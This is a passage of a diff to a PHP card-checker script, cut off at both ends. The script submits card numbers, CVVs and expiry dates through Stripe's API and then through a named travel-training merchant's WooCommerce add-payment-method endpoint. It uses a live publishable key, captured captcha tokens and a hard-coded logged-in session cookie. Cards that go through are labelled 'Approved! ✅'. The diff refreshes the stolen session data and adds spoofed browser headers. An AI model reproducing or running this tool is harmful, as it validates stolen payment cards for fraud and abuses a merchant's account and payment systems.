5M3JjTmo5alRqSFZwZDZud2VCYk52R0xrUjVzVEorZ1kwYm1lOUkxN0lEY2I3RjhmZDlLakZNZXJMQmNVaW16VDVNOElhalNyMWkxZFdxVk8zQ216SFhBNWdsRTJybnJZY0JCNEJOWGVOSUZJL0FBcWZ5blFpaGhuMDZyZjFmUU9hUTFFaUE1ZzBMWWJSZXhRNzBSc0ZjdWlLZXBkcElDOEpBSDdjQ1pMeW11NXQ5YksvWXlka3dWZ1lrK2ZwNXlrZU1hVDA4bzJPQ0N5OE9DVTBiZjVzdHVweXR5ci9Ob3RWMjBPVHVoSW1NdnlhZVdUYkwyNEVDMjlZQ2hxeXhOU0FZM0pVSkZTT0hQRTcwUEZEbnZkM2F2aUJrMXpiRFQrQVlQTlBZaVBtaWNGbjZaaVJsWnR3eEczdjFvSFpjZUw5eVdtZ2I5Vkd4ZmR6YWVYRFNHdmdrOUJoYVhhMmhxMDMxSkVvQTY2RFBVMDhUaDYweTVNZ1FZMnd4UHZYS3RPTFJNT24vNVJCVlNsVGdjSVlPVkc1U1RKQ3ljeUFOMzhBRkJ2SGFnRTFNUjE5MTFjTWdIZmkrTFVaQkQzU2FEY3hhK0xqUjJxTGpFTlBPZ1E0TUo2NU1rS3NlaWRURlBHQzRrSTFBdkwrMzhTK2VxR09rWHlZSDBwTWdXNnNSbHlTL1F4TWg1dk95ZTNyWjdxRnRSdWoyd3p0TUJzeVBZdDZEelpPRDRHRjJiaDIzRUM4cTJvOWpubXQranhyQU82QWloeDdLRUJqakFPbHRVcnFvenZBPT0iLCJleHAiOjE3MzE3OTYxODEsInNoYXJkX2lkIjoyMjE5OTYwNzMsImtyIjoiZThhZGM2NCIsInBkIjowLCJjZGF0YSI6IklQZWowTkcyem5UNFZ2ZENDbEtQWHpkenFZb0J5cnFGNTlnbGpyOUFuNGJ6V3ZDQ0xudERHWmpKVFhITDJuM1lRR09oblpiODEra2dtcGNad3F5K3l0M1Q1V2JYVTJJOVZNRzA4cS9FeFNjTVFiVGNmR3JBdDI4QkZBNTBlUFR4NnZ4SUE0V1pEUnUvUWl3Q2YvVTJPZW1KN3cvdWc0SFFhRzhmNW11bzVXN3ptREYyT1JzM3B0dThvZ3d6d2Q1M1RpNHM1QWdvYTVETFFhNm4ifQ.KTZJIXxZUrKFOeJkr5o2EHvQuJH4DWPa7I26QT_qZ-k',
+  CURLOPT_POSTFIELDS => 'type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&billing_details%5Baddress%5D%5Bpostal_code%5D=10080&billing_details%5Baddress%5D%5Bcountry%5D=US&payment_user_agent=stripe.js%2Ff998a153d0%3B+stripe-js-v3%2Ff998a153d0%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.thetravelinstitute.com&time_on_page=33566&client_attribution_metadata%5Bclient_session_id%5D=c9054b3a-2bfb-44df-8260-a7c7b5de1e1f&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=fa5d9d41-7dd0-489e-8250-c0f3517b2a9164221b&muid=2e26787c-c102-4578-aa4b-fba54c859921bb7405&sid=c8b725f0-d8a9-4fd4-ad28-2cea16b61ba4cd0533&key=pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX&_stripe_version=2024-06-20&radar_options%5Bhcaptcha_token%5D=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5Ijoid1dMTmVKWTMrZlpTQi9MRlBocjI4cmxUTWd3N2Y3TVlRQ3g0dUM0T2Ezam0xeE1wQmxrczBaYTlqYitkUWhaVGpEQVlPYzJIMjdRNjMrWFZKN01YaTE2VFJFOUl5K2s0dEk5d2dKSHpyNTBzSittU2JHZVJlWGdwMHoydFVVd3U5R1loellscGU0N01BZnlXdXpZNlFvMEZVS3ZQd2xiV1JMVmFldjFwNEk2VFdUL1IxeFdpd3AxL052cks3dzZiMTB0eGNzR2w0d2ZEbHdNWTNyR0o0Z3paK0s0aGt1bzVxYkcwb2lpdHhtazRMQlZGQ2ROeElXMGtDQXltazM3cldrNXc3dVY4SE1sZ2tWZ0VCOUt4YTNqSE1mcThkczk1OWZSVlVoVkRmL3U1cWk0a1h2alkxZGhVQk1FQWFmRi9kd3I1Vjdsd0tjcmtNb25ueHFLTHBZRHVmdEV1L1lpeCtMVzYxOS9LOGdtVjJIVERWRFZ2d0JKMG9JclpOeEFYdEsxanhrMmMvc3FlZ2E3Q3VTVGdud3lYNFI0Nk1laGduU3dWNndscU56dDcyaGJ2V25OTGRmMmNGUVBSKzJHSEhHLy9tWFl0V0ZzV3JOM2lRa04xVmFtU1RLYkJZSEVGd2RCUGlTVjFtZndhZnFsY1VsZW5FcHJaNFM1ckFZY3g0THgxaFB0ZHYxNEdFN2VDZ2w1RmJiMEtkS2ZDQzA4L1ZyOTFpcDlTN2hJQVlFS2NBNGtLbVNoaE1lbWtsNDFJTmpFc3lLdDJKeUx6RUhqeXFqTWppTVpWOUlMS2FnZ2ZBOWRFalI4empOelk1RXBnNmNuRmdjUHJMQjBYbEl1aWNUNStQU2FMVmM2d2R4L3ArOW1iMFVMMXduQWJkbE0wVDlLMjd3eFRmaXVCZVA3RVhQQlMxaDA4aVpmK1o0UDcyRmJXZVdIbmx0bWZ5dUxFRnJQTTduZEsvOHlnalV3S25PeTF6aXBQSktkZnJNNmtZWFhMNUVRVFowY2NXNnlIUTdzWC8yQTNIdVBWcWhUVmt2NjhjTnppQzlnaFNIODlFNGVUbkFnYzdrYnQySHhVQ3ZEeDZvNGNiTFRuaHNYK05iR2E4MVg5clRXU2xxZkQ4emFWU2YwRG1CaExCa3A2TEZjZVFmNERKWWpJdFREVm8zQVlkdFZXYWV0bjBvVTU1ZkxySTZFZWF1RURhaEk3b0J3SUVYWlhEYWN5L1o5UGhnVlJaUk5SMDBuU0NHd2dKY0s2akJ4QW0xNGREOHlmZXF4eWxiREd2V2RNbTdQdmp6Vnp3b05HbnRWS2hHSXlkOFVlN3ppV05LS0ZlRkdpWVdGWnMzV255OHUzbHVpT243VjlYU2tRekdlQjk2Z2NzY1QyU21hQlNJQkNZNnVWOUw0eEVGOXBRY2hCRFM2ZVdKelZMd1ZVREFBbTdMMytMdEhCZVpRbXlDRFhHaVdxSC9xQkl4SHpxamZXdFovZUZqNU9SMThFTi85bS8wSTl5clRJd1RSM1VoeUxYR0g5T0Nla2hYOXM4T3VqMXJaYjlobVNJR2lrVWh5MUxSd24ySFUwbTNGWGhYYUdqSnBvdEQ2aXhHVWhMRzRmck1pcktWL1BjSHpnaENLQkhnYTkvVUR3Y05uTzJ0QTdzTkZMYkNBTDZwS2RuZVlqQUFJS2Y0Y3MvRlBZR2NFUWp4RisvME5NdkN4L0NpUW1UWWVMTTJHT1lGUlZwZjFlS0xscUJEZzZ4N3grMTQxZzZ6UW5mdE1nUXM2aTV0SzRuejdJbndoU2Y1cTRwQy8rUjRKcDJrRUZ3N0tvai9WODBicE54SmwrbjZhU0NFdmpKMys1d2p3Y3VDZXdVeFh5V3F6bDQ5ZXpWRnpuclJENUErVUo4Uk5xUEMxT29Zelo2YWRMWjhnalRMWE9BRmJ0UVZlc3VHZm8wOUZUTzliSStkVUpHNndtTURIdHdld2hUbjNQc0VkQVBRUG5qU3hqWE40TlVJcDQzWm9CVnFXU2toSjl3VXRjWVlDVmd4UFJBZjV2Vzd4bTBHckl2VS9RYmhCSzRma0tORjhlWDlINnMrUE9HcTVwcExZU0VxMjNRemRXVTRaK3E2WUlzbGg2VWc2NmJLN0c4VE5hVkpnZDBMZGdzY3dBSWo4S21qdElxaEhoVTI4eTlCaFhYMzhhRW9RMk1uZFdOR3ZBRzhIb3RabFVjK2hPQ3I0WHZCbzFwMlNma1ZjbGM1Um1zY2tMSURMYUpFMGxZYTE3VEJUZzVMY2pZUVRhQ2YzMXp5ZWtML05aSUZTMTJLUjF2YmE4a3lOL2xiUlJ5VG9RdUNhLzBxYnJlbEFITDg1M1p2TkZVTFQ5ZWZQdkR6KzFjR21wVUd5Z3QzNjBwa3k2azNuWEtDb2FXYmlsS1hoRHIwRWV6ZDNTK2I2bjV4VVBLcS9nZCt4ZW1nazQwNTUwS3QrcVNKd0Q5Y1pMWXZDemlOZm94YS9IcEtrZkZ6Z2o0UFZ3WTlUMmIyNlFtaTIySWVDbjRXcmltMnFGSHA3U25tczlVYVBOZTBtckFNMXZZeXBZRVY0eTY1b3lyMHV1S0NhOFRMNDFZdHZsSndlUmx3aVY1ZEROYkhGOTJUSUt6Q1Fycko2U2Q3Q1lsRVdLZWc4YkdrT0lwSFJEUmg4RFB3emQ4NForSWo5TW9nd1JqTmtsYzFmd05NMFJHaTVKR2RlenRRPT0iLCJleHAiOjE3MzYzMDMyMjcsInNoYXJkX2lkIjoyMjE5OTYwNzMsImtyIjoiMzhhZmU0NTYiLCJwZCI6MCwiY2RhdGEiOiJGdjl4TDd0dnd4ck8wc0NYaTNTYkNNRE92aFlnSU1kVGVtQnp4N1I2MWlYYzdORG15TVFCTFVnY2d1THlpTEYxbUIyVVRsVTQyOTBsQjN5eXFRa3hSbkZINzdaaXAvaitTVVVpNkY3SERIcWpzOVFZbzlvTTVyTXFFRHFneXA2NmRtcjBtZ0xjeFkwOE9RbWY1ZFVVM0J3bmh2bWpRemtEWXRJenVMb3pWV2VudGtLcGxlTVErbGZtbCs3U2F0ZmVRQytkUkNWeU4vQXBQVE5wIn0.DGsmA4QzCei_0e4Y2dNPChVr6kdtI2v11J6RtEMpkFo',
   CURLOPT_HTTPHEADER => [
     'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
     'Accept: application/json',
     'Content-Type: application/x-www-form-urlencoded',
     'sec-ch-ua-platform: "Android"',
-    'accept-language: es-US,es;q=0.6',
+    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+    'sec-ch-ua-mobile: ?1',
+    'sec-gpc: 1',
+    'accept-language: es-US,es;q=0.5',
     'origin: https://js.stripe.com',
+    'sec-fetch-site: same-site',
+    'sec-fetch-mode: cors',
+    'sec-fetch-dest: empty',
     'referer: https://js.stripe.com/',
+    'priority: u=1, i',
   ],
 ]);
-
 
 $response = curl_exec($curl);
 $err = curl_error($curl);
 $json = json_decode($response, true);
 $id = $json["id"];
 curl_close($curl);
+
 
 
 $curl = curl_init();
@@ -2576,18 +2599,25 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => 'action=create_and_confirm_setup_intent&wc-stripe-payment-method='.$id.'&wc-stripe-payment-type=card&_ajax_nonce='.$nonce.'',
-  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-16%2022%3A08%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-16%2022%3A08%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; mailchimp.cart.current_email=Dausitherer@cuvox.de; mailchimp_user_email=Dausitherer%40cuvox.de; wordpress_logged_in_104df0bcc01c764423018f9bcd47f262=dausitherer%7C1733004640%7CjNLKpX4cGcCWRTyAV9VhWYrkcDAsoRMd2WR7RBsbGze%7Ced04d655c45184593572d62e373fda864f4990e1661e7924e0a456cd68646307; __stripe_mid=aa379a42-e19a-4c90-9052-16328908a242d00773; __stripe_sid=8f88d6a3-78fb-4159-8d1d-179c9838144e9732ca; sbjs_session=pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F',
+  CURLOPT_POSTFIELDS => 'action=create_and_confirm_setup_intent&wc-stripe-payment-method='.$id.'&wc-stripe-payment-type=card&_ajax_nonce=6a6837e266',
+  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; __stripe_mid=2e26787c-c102-4578-aa4b-fba54c859921bb7405; mailchimp_user_email=Dausitherer%40cuvox.de; wordpress_logged_in_104df0bcc01c764423018f9bcd47f262=dausitherer%7C1737508507%7CkQ0NDWvxtUSzjUm9y4tHOdo87KOvxxrAfqXeXAcly6L%7Cb88250a3e9f28c7927434437f6a2d7da9ae501cf6b279b861491bb8baa209e03; __stripe_sid=c8b725f0-d8a9-4fd4-ad28-2cea16b61ba4cd0533; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-01-08%2002%3A23%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2025-01-08%2002%3A23%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F',
   CURLOPT_HTTPHEADER => [
     'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
     'sec-ch-ua-platform: "Android"',
     'x-requested-with: XMLHttpRequest',
+    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
     'content-type: application/x-www-form-urlencoded; charset=UTF-8',
+    'sec-ch-ua-mobile: ?1',
+    'sec-gpc: 1',
+    'accept-language: es-US,es;q=0.5',
     'origin: https://www.thetravelinstitute.com',
+    'sec-fetch-site: same-origin',
+    'sec-fetch-mode: cors',
+    'sec-fetch-dest: empty',
     'referer: https://www.thetravelinstitute.com/my-account/add-payment-method/',
+    'priority: u=1, i',
   ],
 ]);
-
 
 $response = curl_exec($curl);
 $err = curl_error($curl);
@@ -2600,9 +2630,7 @@ $status = $json['data']['status'];
 curl_close($curl);
 
 if ($success === true && $status === "succeeded") {
-    $respo = "𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅!";
-
-
+    $respo = "Approved! ✅";
 
 $curl = curl_init();
 
@@ -2614,17 +2642,23 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'GET',
-  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-16%2022%3A08%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-16%2022%3A08%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; mailchimp.cart.current_email=Dausitherer@cuvox.de; mailchimp_user_email=Dausitherer%40cuvox.de; wordpress_logged_in_104df0bcc01c764423018f9bcd47f262=dausitherer%7C1733004640%7CjNLKpX4cGcCWRTyAV9VhWYrkcDAsoRMd2WR7RBsbGze%7Ced04d655c45184593572d62e373fda864f4990e1661e7924e0a456cd68646307; __stripe_mid=aa379a42-e19a-4c90-9052-16328908a242d00773; __stripe_sid=8f88d6a3-78fb-4159-8d1d-179c9838144e9732ca; sbjs_session=pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F',
+  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; __stripe_mid=2e26787c-c102-4578-aa4b-fba54c859921bb7405; mailchimp_user_email=Dausitherer%40cuvox.de; wordpress_logged_in_104df0bcc01c764423018f9bcd47f262=dausitherer%7C1737508507%7CkQ0NDWvxtUSzjUm9y4tHOdo87KOvxxrAfqXeXAcly6L%7Cb88250a3e9f28c7927434437f6a2d7da9ae501cf6b279b861491bb8baa209e03; __stripe_sid=c8b725f0-d8a9-4fd4-ad28-2cea16b61ba4cd0533; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-01-08%2002%3A23%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2025-01-08%2002%3A23%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F',
   CURLOPT_HTTPHEADER => [
     'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
+    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+    'sec-ch-ua-mobile: ?1',
     'sec-ch-ua-platform: "Android"',
+    'upgrade-insecure-requests: 1',
+    'sec-gpc: 1',
+    'accept-language: es-US,es;q=0.5',
+    'sec-fetch-site: same-origin',
+    'sec-fetch-mode: navigate',
+    'sec-fetch-user: ?1',
+    'sec-fetch-dest: document',
     'referer: https://www.thetravelinstitute.com/my-account/add-payment-method/',
+    'priority: u=0, i',
   ],
 ]);
-
-$response = curl_exec($curl);
-$err = curl_error($curl);
-curl_close($curl);
 
 $response = curl_exec($curl);
 $err = curl_error($curl);
@@ -2645,17 +2679,29 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'GET',
-  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-16%2022%3A08%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-16%2022%3A08%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; mailchimp.cart.current_email=Dausitherer@cuvox.de; mailchimp_user_email=Dausitherer%40cuvox.de; wordpress_logged_in_104df0bcc01c764423018f9bcd47f262=dausitherer%7C1733004640%7CjNLKpX4cGcCWRTyAV9VhWYrkcDAsoRMd2WR7RBsbGze%7Ced04d655c45184593572d62e373fda864f4990e1661e7924e0a456cd68646307; __stripe_mid=aa379a42-e19a-4c90-9052-16328908a242d00773; __stripe_sid=8f88d6a3-78fb-4159-8d1d-179c9838144e9732ca; sbjs_session=pgs%3D12%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F',
+  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; __stripe_mid=2e26787c-c102-4578-aa4b-fba54c859921bb7405; mailchimp_user_email=Dausitherer%40cuvox.de; wordpress_logged_in_104df0bcc01c764423018f9bcd47f262=dausitherer%7C1737508507%7CkQ0NDWvxtUSzjUm9y4tHOdo87KOvxxrAfqXeXAcly6L%7Cb88250a3e9f28c7927434437f6a2d7da9ae501cf6b279b861491bb8baa209e03; __stripe_sid=c8b725f0-d8a9-4fd4-ad28-2cea16b61ba4cd0533; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-01-08%2002%3A23%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2025-01-08%2002%3A23%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F',
   CURLOPT_HTTPHEADER => [
     'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
+    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+    'sec-ch-ua-mobile: ?1',
     'sec-ch-ua-platform: "Android"',
+    'upgrade-insecure-requests: 1',
+    'sec-gpc: 1',
+    'accept-language: es-US,es;q=0.5',
+    'sec-fetch-site: same-origin',
+    'sec-fetch-mode: navigate',
+    'sec-fetch-user: ?1',
+    'sec-fetch-dest: document',
     'referer: https://www.thetravelinstitute.com/my-account/payment-methods/',
+    'priority: u=0, i',
   ],
 ]);
 
 $response = curl_exec($curl);
 $err = curl_error($curl);
+
 curl_close($curl);
+
 
 
 } elseif ($success === true && $status === "requires_action") {
@@ -2681,13 +2727,13 @@ if (empty($respo)) {
 }
 
 if (array_in_string($respo, $live_array)) {
